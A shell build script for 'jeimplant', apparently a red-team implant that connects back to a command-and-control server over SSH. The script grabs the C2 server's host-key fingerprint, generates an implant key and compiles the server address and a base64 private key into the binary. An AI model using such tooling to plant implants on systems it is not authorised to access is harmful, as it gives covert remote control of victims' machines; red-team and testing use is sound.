#!/bin/sh
#
# build.sh
# Build script for jeimplant
# By J. Stuart McMurray
# Created 20220326
# Last Modified 20220331

set -e

# MAINFILE is the file with main(), used to see if we're in the right directory
MAINFILE=jeimplant.go

# Defaults
PROTO=""
KEYF="id_ed25519_implant"
OUTF="../bin/jeimplant"
FP=""
VER=""
DEBUG=""
CKEY=""
CPORT="10022"
CADDR="127.0.0.1"

usage(){
        cat >&2 <<_eof
Usage: $0 [options] c2addr

Builds an implant which will connect to the given C2 address.  The server's
hostkey's fingerprint can either be given with -f or grabbed from the
server.

Options:
        -P protocol
        -k Private key file (default $KEYF)
        -o Output filename (default $OUTF)
        -f C2 server fingerprint
        -b Implant SSH version
        -d Debug mode; enable "set +x"

        Fingerprint autograbbing:
        -i Operator SSH key
        -p C2 server port (default $CPORT)
        -a C2 server address (default $CADDR)
_eof
exit 2
}

# Needvar prints tha $2 is missing is $1 is empty.  It then calls usage.
needvar() {
        if [ -z "$1" ]; then
                echo "Missing $2" >&2
                echo >&2
                usage
        fi
}

# getfingerprint tries to get a fingerprint from the server
getfingerprint() {
        # Make sure we have a server
        if [ -z "$CADDR" ]; then
                echo "Need a server address for fingerprint autograbbing" >&2
                exit 4
        fi
        # Roll an SSH command
        CMD="ssh -p $CPORT"
        if ! [ -z "$CKEY" ]; then
                CMD="$CMD -i $CKEY"
        fi
        CMD="$CMD $CADDR fingerprint"
        # Ask the nice way
        FP=$($CMD || echo "Failed to authenticatedly autograb fingerprint" >&2)
        if ! [ -z "$FP" ]; then
                return
        fi

        # Try to get it with a partial handshake
        FP=$(ssh-keyscan -p "$CPORT" "$CADDR" | ssh-keygen -lf - | tail -n 1 | awk '{print $2}')
        if [ -z "$FP" ]; then
                echo "Failed to unauthenticatedly autograb fingerprint" >&2
                exit 5
        fi
}

# Work out if defaults need changed
while getopts P:k:o:f:i:p:a:b:dh name; do
        case "$name" in
                P)   PROTO=${OPTARG:-$PROTO} ;;
                k)   KEYF=${OPTARG:-$KEYF}   ;;
                o)   OUTF=${OPTARG:-$OUTF}   ;;
                f)   FP=${OPTARG:-$FP}       ;;
                i)   CKEY=${OPTARG:-$CKEY}   ;;
                p)   CPORT=${OPTARG:-$CPORT} ;;
                a)   CADDR=${OPTARG:-$CADDR} ;;
                b)   VER=${OPTARG:-$VER}     ;;
                d)   DEBUG=1                 ;;
                h|?) usage                   ;;
        esac
done
shift $(($OPTIND - 1))
ADDR=${1:-$ADDR}

# Maybe enable more messages?
if ! [ -z "$DEBUG" ]; then
        set -x
fi

# Quick check to see if we're probably in the right place
if ! [ -f "$MAINFILE" ]; then
        echo "Can't find $MAINFILE.  Are we in the right directory?" >&2
        exit 3
fi

# Make sure we have everything we need
needvar "$ADDR" "server address"
needvar "$KEYF" "key file"
needvar "$OUTF" "output filename"

# Get a fingerprint if we don't have one
if [ -z "$FP" ]; then
        echo -n "Autograbbing server fingerprint..."
        getfingerprint
        echo "done"
        echo "Autograbbed server fingerprint: $FP"
fi

# If we don't have a keyfile, make one
if ! [ -f "$KEYF" ]; then
        echo -n "Generating key in $KEYF..."
        ssh-keygen -t ed25519 -f "$KEYF" -q -N ""
        echo "done"
        ssh-keygen -y -f "$KEYF"
fi

# Work out the compile-time config
addldflag() { if ! [ -z $2 ]; then LDFLAGS="$LDFLAGS -X main.$1=$2"; fi }
LDFLAGS="-X main.ServerAddr=$ADDR -X main.ServerFP=$FP -X main.PrivKey=$(cat "$KEYF" | openssl base64 -A)"
addldflag ServerProto "$PROTO"
addldflag SSHVersion "$VER"

# Build the implant
mkdir -p "$(dirname $OUTF)"
echo -n "Building implant..."
go build -v -ldflags "$LDFLAGS" -trimpath -o $OUTF
echo done
ls -lart $OUTF
